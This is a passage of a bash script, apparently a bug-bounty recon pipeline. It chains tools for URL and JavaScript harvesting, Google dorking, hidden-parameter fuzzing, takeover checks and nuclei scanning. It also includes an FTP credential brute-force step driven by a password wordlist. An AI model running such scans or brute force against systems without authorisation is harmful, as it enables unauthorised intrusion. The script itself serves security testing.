	timelimitx -t ${ROBOXTRACTOR_TIMELIMITX} "echo ${TARGET} | roboxtractor -s -m 0 | unew -el -t -q ${URLSDIR}/roboxtractor.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/roboxtractor.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/roboxtractor.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] ROBOXTRACTOR${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/roboxtractor.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ROBOTXT(){
	START_SPINNER "${BGREEN}ROBOTXT${RESET}"

	timelimitx -t ${ROBOTXT_TIMELIMITX} "echo ${TARGET} | robotxt -silent -complete -delay $ROBOTXT_DELAY -timeout $ROBOTXT_TIMEOUT 2>/dev/null | sed 's/^\Disallow: //' | sed 's/^\Allow: //' | unew -el -t -q ${URLSDIR}/robotxt.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/robotxt.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/robotxt.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] ROBOTXT${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/robotxt.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# Google Dorking
AUTOMATED_GOOGLE_DORKING(){
	START_SPINNER "${BGREEN}AUTOMATED_GOOGLE_DORKING${RESET}"

    echo "${TARGET}" | gorker --silent --wait 0 -o ${URLSDIR}/automated_google_dorking.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] AUTOMATED_GOOGLE_DORKING${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/automated_google_dorking.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MANUAL_GOOGLE_DORKING(){
    if [ ! -s "$ROOT_INPUTFILES/manual_google_dorking.txt" ]; then
        echo -e "${GRAY}[!] I collected google dorks output as much as i can using automated tools, You can add your manual google dorks output in ${URLSDIR}/manual_google_dorking.urls currently file is empty. Please choose an option:${RESET}"
        echo -e "${GRAY}1. Wait for up to 30 minutes, I'm not done yet still doing google dorking but allow me to continue if i'm done earlier by pressing Enter button"
        echo -e "${GRAY}2. Done, I have done google dorking don't wait now"
        echo -e "${GRAY}3. Skip, I don't have time for manual google dorking"

        # Read user input with a timeout of 1 minute
        read -t ${MANUAL_GOOGLE_DORKING_OPTION_WAIT} -p "Select an option (1/2/3): " option

        # If no input after 60 seconds, automatically select Option 1
        if [ -z "$option" ]; then
            option=${MANUAL_GOOGLE_DORKING_OPTION_SELECT}
            echo -e "\n${GRAY}[+] No input received from user, automatically choosing Option ${MANUAL_GOOGLE_DORKING_OPTION_SELECT}${RESET}"
        fi
        
        case "$option" in
            1)
                echo -e "${BGREEN}[+] Waiting for up to 30 minutes. Press Enter if you're done early...${RESET}"

                echo -e "MANUAL_GOOGLE_DORKING: Waiting for manually google dorking" | notify -silent -duc -id xssnotify &>/dev/null
                
                # Display prompt once and enter wait loop
                counter=0
                while true; do
                    read -t 60 -n 1 input
                    if [ $? -eq 0 ]; then
                        echo -e "${BGREEN}[+] Done early! Proceeding...${RESET}"

                        break
                    fi
                    # Exit after 30 minutes if Enter is not pressed
                    ((counter++))
                    if [ $counter -eq ${MANUAL_GOOGLE_DORKING_TIME} ]; then
                        echo -e "${BGREEN}[+] 30 minutes have passed. Proceeding...${RESET}"
                        break
                    fi
                done
                ;;
            2)
                echo -e "${BGREEN}[+] Done with Google dorking. Proceeding...${RESET}"
                ;;
            3)
                echo -e "${YELLOW}[!] Skipping manual Google dorking.${RESET}"
                return
                ;;
            *)
                echo -e "${YELLOW}[!] Invalid option. Skipping manual Google dorking.${RESET}"
                return
                ;;
        esac
    fi

    # Display the count of lines in manual_google_dorking.urls
    echo -e "${BGREEN}[+] MANUAL_GOOGLE_DORKING${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/manual_google_dorking.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# JS Crawling
SUBJS(){
	START_SPINNER "${BGREEN}SUBJS${RESET}"

	timelimitx -t ${SUBJS_TIMELIMITX} "echo ${TARGET} | subjs | unew -el -i -t -q ${URLSDIR}/subjs.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/subjs.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/subjs.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBJS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/subjs.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GETJS(){
	START_SPINNER "${BGREEN}GETJS${RESET}"

	timelimitx -t ${GETJS_TIMELIMITX} "echo ${TARGET} | getJS --complete | unew -el -i -t -q ${URLSDIR}/getJS.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/getJS.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/getJS.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GETJS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/getJS.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSCRAWLER(){
	START_SPINNER "${BGREEN}JSCRAWLER${RESET}"

	timelimitx -t ${JSCRAWLER_TIMELIMITX} "echo ${TARGET} | jscrawler --silent --complete --timeout 15 --threads 50 | egrep -av '\(' | sed 's/\\$//' | unew -el -i -t -q ${URLSDIR}/jscrawler.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/${URLSDIR}/jscrawler.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/jscrawler.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSCRAWLER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/jscrawler.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSFINDER(){
	START_SPINNER "${BGREEN}JSFINDER${RESET}"

	echo "${TARGET}" | jsfinder -s -read -c 20 -o ${URLSDIR}/jsfinder.urls &>/dev/null

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/jsfinder.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/jsfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/jsfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JAVASCRIPT_DEOBFUSCATOR(){
	START_SPINNER "${BGREEN}JAVASCRIPT_DEOBFUSCATOR${RESET}"

	# https://github.com/ben-sb/javascript-deobfuscator

	STOP_SPINNER
	echo -e "${BGREEN}[+] JAVASCRIPT_DEOBFUSCATOR${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/javascript_deobfuscator.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

LINKFINDER(){
	START_SPINNER "${BGREEN}LINKFINDER${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINKFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/linkfinder.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XNLINKFINDER(){
	START_SPINNER "${BGREEN}XNLINKFINDER${RESET}"

	timelimitx -t ${XNLINKFINDER_TIMELIMITX} "echo ${TARGET} | xnLinkFinder --no-banner --scope-prefix ${SUBDOMAINDIR}/alivesubs.txt --scope-filter ${TARGET} --depth 3 --timeout 10 --max-time-limit 60 -o ${URLSDIR}/xnLinkFinder.urls -op ${URLSDIR}/xnLinkFinder.params" &>/dev/null

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xnLinkFinder.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/xnLinkFinder.urls
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xnLinkFinder.params 2>/dev/null | unew -el -t -q ${URLSDIR}/xnLinkFinder.params

	STOP_SPINNER
	echo -e "${BGREEN}[+] XNLINKFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/xnLinkFinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GETJSWORDS(){
	START_SPINNER "${BGREEN}GETJSWORDS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] GETJSWORDS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/getjswords.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SOURCEMAPPER(){
	START_SPINNER "${BGREEN}SOURCEMAPPER${RESET}"

	cat ${URLSDIR}/*.urls | grep -a "\.js$" | sed 's/\.js$/.js.map/' | unew -el -t -q ${URLSDIR}/jsmaplinks.txt
	cat ${URLSDIR}/*.urls | grep -a "\.js.map$" | unew -el -t -q ${URLSDIR}/jsmaplinks.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$URLSDIR/jsmaplinks.txt" ]; then
        echo -e "${BRED}[x] SOURCEMAPPER${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    # Run the commands if the file has content
	cat ${URLSDIR}/jsmaplinks.txt | interlace --silent -threads 10 -c "sourcemapper -insecure -url _target_ -output _output_/_cleantarget_" -o ${SOURCEMAPPERDIR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	# cat ${SOURCEMAPPERDIR}/*.urls | unew -el -t -q ${URLSDIR}/sourcemapper.urls

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/urls/sourcemapper.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/sourcemapper.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] SOURCEMAPPER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/sourcemapper.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

LINX(){
	START_SPINNER "${BGREEN}LINX${RESET}"

	cat ${URLSDIR}/*.urls | grep -a "\.js$" | unew -el -i -t -q ${URLSDIR}/linx_jslinks.txt
	i=1; while IFS= read -r target; do linx -target "$target" -output "linx_${i}.html"; ((i++)); done < ${URLSDIR}/linx_jslinks.txt

	# Write golang code that will fetch path in .html along with input/title
	# cat index.html | go run linx-filter.go
	# cat *.html | go run linx-filter.go

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/urls/naabu.txt 2>/dev/null | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/bugbountydata.subs

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINX${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/linx.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSLUICE(){
	START_SPINNER "${BGREEN}LINX${RESET}"

	cat ${URLSDIR}/*.urls | grep -a "\.js$" | unew -el -i -t -q ${URLSDIR}/jsluice_jslinks.txt
	cat ${URLSDIR}/jsluice_jslinks.txt | jsluice urls --no-check-certificate --concurrency 5 | unew -a -q ${URLSDIR}/jsluice_urls.txt

	# cat ${URLSDIR}/jsluice_urls.txt | filteroutput | unew -el -i -t -q ${URLSDIR}/jsluice.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/jsluice.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/jsluice.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINX${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/jsluice.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Hidden Parameter
PARAMFINDER(){
	START_SPINNER "${BGREEN}PARAMFINDER${RESET}"

	if [ "$PARAMFINDER_SCAN_MODE" = "NORMAL" ]; then
		cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx|html)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
	fi

	if [ "$PARAMFINDER_SCAN_MODE" = "ADVANCED" ]; then
		cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-4 | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-5 | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-6 | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
		cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx|html)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	cat ${URLSDIR}/paramfinderlinks.txt | paramfinder --silent --insecure -c ${PARAMFINDER_THREADS} --timeout ${PARAMFINDER_TIMEOUT} | grep 'TRANSFORM_URL:' | sed 's/^TRANSFORM_URL: //' | unew -el -i -t -q ${URLSDIR}/paramfinder.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/paramfinder.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/paramfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] PARAMFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/paramfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MSARJUN(){
	START_SPINNER "${BGREEN}MSARJUN${RESET}"

	cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt
	timelimitx -t ${MSARJUN_TIMELIMITX} "cat ${URLSDIR}/paramfinderlinks.txt | msarjun -silent -arjunCmd \"arjun -u {urlStr} -m GET,POST,XML,JSON\" -concurrency 1 -json -ao ${URLSDIR}/msarjun.json" &>/dev/null
	cat ${URLSDIR}/msarjun.json | jq -r '.transformed_url' | unew -el -t -q ${URLSDIR}/msarjun.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/msarjun.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/msarjun.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] MSARJUN${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/msarjun.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

X8(){
	START_SPINNER "${BGREEN}X8${RESET}"

	cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | grep -aE '\.(php|jsp|jspa|asp|aspx)$' | egrep -av "=" | unew -el -t -q ${URLSDIR}/paramfinderlinks.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$URLSDIR/paramfinderlinks.txt" ]; then
        echo -e "${BRED}[x] X8${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	timelimitx -t ${X8_TIMELIMITX} "cat ${URLSDIR}/paramfinderlinks.txt | interlace --silent -threads 1 -c \"x8 -u _target_ -X GET POST XML JSON --disable-progress-bar --output-format json --append --output _output_/x8.json\" -o ${URLSDIR} 2>/dev/null"

	cat ${URLSDIR}/x8.json | jq -r '.[] | select(.found_params | length > 0) | "Transformed URL [\(.method)]: \(.url)?\( ([.found_params[] | "\(.name)=rix4uni"] | join("&")) )"' | unew -el -t -q ${URLSDIR}/x8.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/x8.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/x8.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] X8${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/x8.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ALLURLS(){
	START_SPINNER "${BGREEN}ALLURLS${RESET}"

	cat ${URLSDIR}/*.urls | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${ROOT_URLSDIR}/allurls.txt

	cat ${ROOT_URLSDIR}/allurls.txt | urldedupe -s | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${URLSDIR}/filteredurls.txt

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/urls/allurls.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${ROOT_URLSDIR}/allurls.txt
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/filteredurls.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${URLSDIR}/filteredurls.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] ALLURLS${RESET}: $(wc -l 2>/dev/null < ${ROOT_URLSDIR}/allurls.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
	echo -e "${BGREEN}[+] FILTEREDALLURLS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/filteredurls.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SUBDOMAIN_SCRAPING(){
	START_SPINNER "${BGREEN}SUBDOMAIN_SCRAPING${RESET}"

	cat ${ROOT_URLSDIR}/allurls.txt | sed -e 's/https\?:\/\/\(www\.\)\?//' | cut -d"/" -f1 | unew -ef -el -i -t ${ROOT_SUBDOMAINDIR}/allsubs.txt | unew -ef -el -i -t ${SUBDOMAINDIR}/subdomain_scraping.subs

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/urls/allurls.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${ROOT_URLSDIR}/allurls.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBDOMAIN_SCRAPING${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/subdomain_scraping.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JS_SUBDOMAINS(){
	START_SPINNER "${BGREEN}JS_SUBDOMAINS${RESET}"

	cat ${ROOT_URLSDIR}/allurls.txt | grep -a "\.js$" | unew -ef -el -q ${URLSDIR}/js_subdomains_jslinks.txt
	for target in $(cat ${URLSDIR}/js_subdomains_jslinks.txt);do echo $target;done

	for target in $(cat "${URLSDIR}/js_subdomains_jslinks.txt"); do
	  curl -s "$target" | grep -oP '(\*-[a-zA-Z0-9]+(\.[a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|\*\.?[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+(\.\*)?\.[a-zA-Z0-9]+(\.[a-zA-Z]{2,}))' | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -ef -el -q ${URLSDIR}/js_subdomains.txt
	done

	cat allurls.txt | interlace --silent -threads 10 -c "curl -s _target_ | grep -oP '(\*-[a-zA-Z0-9]+(\.[a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|\*\.?[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+([.-][a-zA-Z0-9]+)*\.[a-zA-Z]{2,}|[a-zA-Z0-9]+(\.\*)?\.[a-zA-Z0-9]+(\.[a-zA-Z]{2,}))' >> _output_/_cleantarget_.txt" -o ${PDFTOTEXTDIR}

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/urls/js_subdomains.txt 2>/dev/null | eval ${URLS_FILTER} | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -i -t -q ${ROOT_URLSDIR}/js_subdomains.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] JS_SUBDOMAINS${RESET}: $(wc -l 2>/dev/null < ${ROOT_URLSDIR}/js_subdomains.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MANUAL_ALLURLS_FILTER(){
    echo -e "${GRAY}[!] Remove unnecessary urls manually in $URLSDIR/filteredurls.txt. Please choose an option:${RESET}"
    echo -e "${GRAY}1. Wait for up to 30 minutes, I'm not done yet still removing unnecessary urls manually but allow me to continue if i'm done earlier by pressing Enter button"
    echo -e "${GRAY}2. Done, I have removed unnecessary urls manually don't wait now"
    echo -e "${GRAY}3. Skip, I don't have time for removing unnecessary urls manually"

    # Read user input with a timeout of 1 minute
    read -t ${MANUAL_ALLURLS_FILTER_OPTION_WAIT} -p "Select an option (1/2/3): " option

    # If no input after 60 seconds, automatically select Option 1
    if [ -z "$option" ]; then
        option=${MANUAL_ALLURLS_FILTER_OPTION_SELECT}
        echo -e "\n${GRAY}[+] No input received from user, automatically choosing Option ${MANUAL_ALLURLS_FILTER_OPTION_SELECT}${RESET}"
    fi
        
    case "$option" in
        1)
            echo -e "${BGREEN}[+] Waiting for up to 30 minutes. Press Enter if you're done early...${RESET}"

            echo -e "MANUAL_ALLURLS_FILTER: Remove unnecessary urls manually" | notify -silent -duc -id xssnotify &>/dev/null

            # Display prompt once and enter wait loop
            counter=0
            while true; do
                read -t 60 -n 1 input
                if [ $? -eq 0 ]; then
                    echo -e "${BGREEN}[+] Done early! Proceeding...${RESET}"
                    break
                fi
                # Exit after 30 minutes if Enter is not pressed
                ((counter++))
                if [ $counter -eq ${MANUAL_ALLURLS_FILTER_TIME} ]; then
                    echo -e "${BGREEN}[+] 30 minutes have passed. Proceeding...${RESET}"
                    break
                fi
            done
            ;;
        2)
            echo -e "${BGREEN}[+] Done with removing unnecessary urls manually. Proceeding...${RESET}"
            ;;
        3)
            echo -e "${YELLOW}[!] Skipping removing unnecessary urls manually.${RESET}"
            return
            ;;
        *)
            echo -e "${YELLOW}[!] Invalid option. Skipping removing unnecessary urls manually.${RESET}"
            return
            ;;
    esac

    # Display the count of lines in filteredurls.txt
    echo -e "${BGREEN}[+] MANUAL_ALLURLS_FILTER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/filteredurls.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Program Based Wordlist Generator
CEWL(){
	START_SPINNER "${BGREEN}CEWL${RESET}"

	echo "${TARGET}" | interlace --silent -threads 10 -c "cewl _target_ -d 2 -m 3 | sed '1d' > _output_/_cleantarget_.txt" -o ${CEWL}
	cat ${CEWL}/*.txt | unew -el -t -q ${ROOT_WORDLISTDIR}/cewl.params

	STOP_SPINNER
	echo -e "${BGREEN}[+] CEWL${RESET}: $(wc -l 2>/dev/null < ${ROOT_WORDLISTDIR}/cewl.params || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

UNFURL(){
	START_SPINNER "${BGREEN}UNFURL${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] UNFURL${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/unfurl.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CUSTOM_PARAM(){
	START_SPINNER "${BGREEN}CUSTOM_PARAM${RESET}"

	cat ${ROOT_URLSDIR}/allurls.txt | grep -aE '\.(php|jsp|jspa|asp|aspx)' | sed 's/\(\.\(php\|jsp\|jspa\|asp\|aspx\)\).*$/\1/' | rev | cut -d"/" -f1 | rev | cut -d"." -f1 | sed 's/[A-Z]\+/\n&/g' | unew -el -t -q ${ROOT_WORDLISTDIR}/custom_param.txt
	cat ${ROOT_URLSDIR}/allurls.txt | grep -aE '\.(php|jsp|jspa|asp|aspx)' | sed 's/\(\.\(php\|jsp\|jspa\|asp\|aspx\)\).*$/\1/' | rev | cut -d"/" -f1 | rev | cut -d"." -f1 | sed 's/[A-Z]\+/\n&/g' | unew -el -i -t -q ${ROOT_WORDLISTDIR}/custom_param.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] CUSTOM_PARAM${RESET}: $(wc -l 2>/dev/null < ${ROOT_WORDLISTDIR}/custom_param.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

COOK(){
	START_SPINNER "${BGREEN}COOK${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] COOK${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/cook.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Password Dictionary Generation
PYDICTOR(){
	START_SPINNER "${BGREEN}PYDICTOR${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] PYDICTOR${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/pydictor.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


FFUF_CUSTOM_PARAM(){
	START_SPINNER "${BGREEN}FFUF_CUSTOM_PARAM${RESET}"

	# https://freedium.cfd/https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f
	ffuf -w ${ROOT_WORDLISTDIR}/custom_param.txt -X POST -d "FUZZ=rix4uni" -u "https://redacted.org/searchProgressCommitment.php"

	STOP_SPINNER
	echo -e "${BGREEN}[+] FFUF_CUSTOM_PARAM${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ffuf_custom_param.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Subdomain Takeover
SUBZY(){
	START_SPINNER "${BGREEN}SUBZY${RESET}"

	subzy run --timeout $SUBZY_TIMEOUT --concurrency $SUBZY_CONCURRENCY --hide_fails --targets ${SUBDOMAINDIR}/alivesubs.txt 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null | sed -e 's/\x1b\[[0-9;]*m//g' | egrep -av "\[NOT VULNERABLE\]" | unew -el -q ${ROOT_VULNDIR}/subzy.takeover

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBZY${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/subzy.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

NUCLEI(){
	START_SPINNER "${BGREEN}NUCLEI${RESET}"

	echo "${TARGET}" | nuclei -duc -silent -nc -nh -tags takeover -severity info,low,medium,high,critical -retries $NUCLEI_RETRIES -rl $NUCLEI_RATELIMIT -t templates/takeovers | unew -el -t -q ${ROOT_VULNDIR}/nuclei.takeover

	STOP_SPINNER
	echo -e "${BGREEN}[+] NUCLEI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/nuclei.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# MX Takeover
MXTAKEOVER(){
	START_SPINNER "${BGREEN}MXTAKEOVER${RESET}"

	echo "${TARGET}" | mx-takeover -check-whois -w 20 -output ${ROOT_VULNDIR}/mxtakeover.json &>/dev/null

	STOP_SPINNER
	echo -e "${BGREEN}[+] MXTAKEOVER${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/mxtakeover.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# DNS takeover
DNSTAKE(){
	START_SPINNER "${BGREEN}DNSTAKE${RESET}"

	echo "${TARGET}" | dnstake --silent --concurrent 25 | unew -el -t -q ${ROOT_VULNDIR}/dnstake.takeover

	STOP_SPINNER
	echo -e "${BGREEN}[+] DNSTAKE${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/dnstake.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# Zone Transfer
DIG(){
	START_SPINNER "${BGREEN}DIG${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] DIG${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/dig.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Vulnerability Scanning
FTP(){
	START_SPINNER "${BGREEN}FTP${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | grep -a ":21$" | unew -el -i -t -q ${VULNDIR}/ftp-urls.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$VULNDIR/ftp-urls.txt" ]; then
        echo -e "${BRED}[x] FTP${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${VULNDIR}/ftp-urls.txt | interlace --silent -threads 10 -c "ftpx -mode upc -ip _target_ -wordlist wordlists/ftp-username-password.txt > _output_/_cleantarget_.txt" -o ${FTPDIR}
	cat ${FTPDIR}/*.txt 2>/dev/null | unew -el -t -q ${VULNDIR}/ftp.txt

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/ftp.txt" ] && [ $(wc -l < "${VULNDIR}/ftp.txt") -gt 0 ]; then
	    cp "${VULNDIR}/ftp.txt" "${ROOT_VULNDIR}/ftp.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] FTP${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ftp.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SSH(){
	START_SPINNER "${BGREEN}SSH${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | grep -a ":22$" | unew -el -i -t -q ${VULNDIR}/ssh-urls.txt

